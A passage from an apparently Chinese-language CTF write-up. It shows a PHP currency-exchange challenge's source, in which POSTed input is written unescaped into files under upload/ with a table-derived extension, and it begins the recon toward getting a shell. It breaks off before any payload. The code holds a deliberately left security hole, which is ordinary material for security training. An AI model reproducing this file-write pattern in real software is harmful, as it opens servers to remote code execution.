\u0026#34;LSL\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Liberia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;LRD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Libya\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;LYD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Liechtenstein\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CHF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Lithuania\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Luxembourg\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Macau\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MOP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Madagascar\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MGA\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Malawi\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MWK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Malaysia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MYR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Maldives\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MVR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Mali\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Malta\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Marshall Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Mauritania\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MRU\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Mauritius\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Mexico\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MXN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Micronesia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Moldova\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MDL\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Monaco\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Mongolia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MNT\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Montenegro\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Montserrat\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XCD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Morocco\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MAD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Mozambique\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MZN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Myanmar\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MMK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Namibia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NAD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Nauru\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AUD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Nepal\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NPR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Netherlands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;New Caledonia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XPF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;New Zealand\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NZD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Nicaragua\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NIO\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Niger\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Nigeria\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NGN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Niue\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NZD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;North Macedonia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MKD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Northern Cyprus\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TRY\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Norway\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NOK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Oman\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;OMR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Pakistan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;PKR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Palau\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Palestine\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ILS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Panama\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;PAB\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Papua New Guinea\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;PGK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Paraguay\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;PYG\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Peru\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;PEN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Philippines\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;PHP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Pitcairn Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;NZD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Poland\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;PLN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Portugal\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Qatar\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;QAR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Romania\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;RON\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Russia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;RUB\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Rwanda\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;RWF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Saba\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Sahrawi Republic\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;MAD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Saint Helena\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SHP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Saint Kitts and Nevis\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XCD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Saint Lucia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XCD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Saint Pierre and Miquelon\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Samoa\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;WST\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Saint Barthélemy\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;San Marino\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;São Tomé and Príncipe\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;STN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Saudi Arabia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SAR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Senegal\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Serbia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;RSD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Seychelles\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SCR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Sierra Leone\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SLE\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Singapore\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SGD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Sint Eustatius\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Sint Maarten\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ANG\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Slovakia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Slovenia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Solomon Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SBD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Somalia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SOS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;South Africa\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ZAR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;South Ossetia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;RUB\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;South Sudan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SSP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Spain\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Sri Lanka\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;LKR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Sudan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SDG\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Suriname\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SRD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Sweden\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SEK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Switzerland\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CHF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Syria\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SYP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Taiwan / Republic of China\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TWD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Tajikistan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TJS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Tanzania\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TZS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Thailand\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;THB\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Togo\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Tonga\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TOP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Transnistria\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;RUB\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Trinidad and Tobago\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TTD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Tunisia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TND\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Turkey\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TRY\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Turkmenistan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;TMT\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Turks and Caicos Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Tuvalu\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AUD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Uganda\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;UGX\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Ukraine\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;UAH\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;United Arab Emirates\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AED\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;United Kingdom\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GBP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;United States\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Uruguay\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;UYU\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Uzbekistan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;UZS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Vanuatu\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;VUV\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Vatican City\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Venezuela\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;VES\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Vietnam\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;VND\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Wallis and Futuna\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XPF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Yemen\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;YER\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Zambia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ZMW\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Zimbabwe\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;none\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), ); ::: index.php :::spoiler Source Code \u0026lt;?php error_reporting(E_ALL \u0026amp; ~E_WARNING \u0026amp; ~E_NOTICE); include(\u0026#34;currency.php\u0026#34;); $resultLink = \u0026#34;\u0026#34;; if ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) { $region = $_POST[\u0026#34;region\u0026#34;]; $amount = $_POST[\u0026#34;amount\u0026#34;]; $isoName = $countryData[$region][\u0026#34;ISO\u0026#34;]; $rate = $countryData[$region][\u0026#34;toTWD\u0026#34;]; $convertedAmount = $amount * $rate ?: $amount; $htmlContent = \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026#34;; $htmlContent .= \u0026#34;\u0026lt;h1\u0026gt; Exchange result \u0026lt;/h1\u0026gt;\u0026#34;; $htmlContent .= \u0026#34;\u0026lt;p\u0026gt;{$amount} TWD = {$convertedAmount} {$isoName}\u0026lt;/p\u0026gt;\u0026#34;; $htmlContent .= \u0026#34;\u0026lt;a href=\u0026#39;/\u0026#39;\u0026gt;Back to Home\u0026lt;/a\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;; $filePath = \u0026#34;upload/\u0026#34; . md5(uniqid()) . \u0026#34;.\u0026#34; . $isoName; file_put_contents($filePath, $htmlContent); $resultLink = \u0026#34;\u0026lt;a href=\u0026#39;\u0026#34; . $filePath . \u0026#34;\u0026#39;\u0026gt; 👁️ exchange result\u0026lt;/a\u0026gt;\u0026#34;; } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;🪙Exchange Station\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.googleapis.com\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.gstatic.com\u0026#34; crossorigin /\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;ts-segment\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ts-app-navbar is-fluid\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;ts-icon is-house-icon\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;label\u0026#34;\u0026gt;Home\u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;ts-container is-very-narrow\u0026#34;\u0026gt; \u0026lt;fieldset class=\u0026#34;ts-fieldset\u0026#34;\u0026gt; \u0026lt;legend\u0026gt;🪙Exchange Station\u0026lt;/legend\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;region\u0026#34;\u0026gt;🌏Region\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;ts-select\u0026#34;\u0026gt; \u0026lt;select name=\u0026#34;region\u0026#34; id=\u0026#34;region\u0026#34;\u0026gt; \u0026lt;?php foreach ($countryData as $region =\u0026gt; $data): ?\u0026gt; \u0026lt;option value=\u0026#34;\u0026lt;?php echo $region; ?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php echo $region; ?\u0026gt;\u0026lt;/option\u0026gt; \u0026lt;?php endforeach; ?\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;ts-input is-labeled\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;label\u0026#34;\u0026gt;💵Amount \u0026lt;/span\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;amount\u0026#34; name=\u0026#34;amount\u0026#34; required\u0026gt; \u0026lt;span class=\u0026#34;label\u0026#34;\u0026gt;TWD\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button class=\u0026#34;ts-button\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if ($resultLink) { echo $resultLink; } ?\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ::: Recon # 這一題是賽後解，所以參考了官解，其實我快要接近答案了，思考的邏輯也沒有錯，只是真的不夠細心，沒有觀察到小巧思\n先觀察dockerfile，可以發現我們要找的flag就是在根目錄，所以沒意外應該是要拿到shell\n再看這隻程式在幹麻 這個網站就只有轉換匯率的功能，轉換匯率的table就放在currency.php，首先前端可選擇要轉換的國家幣值，然後填入數字他就會把這兩個parameters存成一個檔案，接著我們就可query他\n出現問題的code\n\u0026lt;?php error_reporting(E_ALL \u0026amp; ~E_WARNING \u0026amp; ~E_NOTICE); include(\u0026#34;currency.php\u0026#34;); $resultLink = \u0026#34;\u0026#34;; if ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) { $region = $_POST[\u0026#34;region\u0026#34;]; $amount = $_POST[\u0026#34;amount\u0026#34;]; $isoName = $countryData[$region][\u0026#34;ISO\u0026#34;]; $rate = $countryData[$region][\u0026#34;toTWD\u0026#34;]; $convertedAmount = $amount * $rate ?: $amount; $htmlContent = \u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026#34;; $htmlContent .= \u0026#34;\u0026lt;h1\u0026gt; Exchange result \u0026lt;/h1\u0026gt;\u0026#34;; 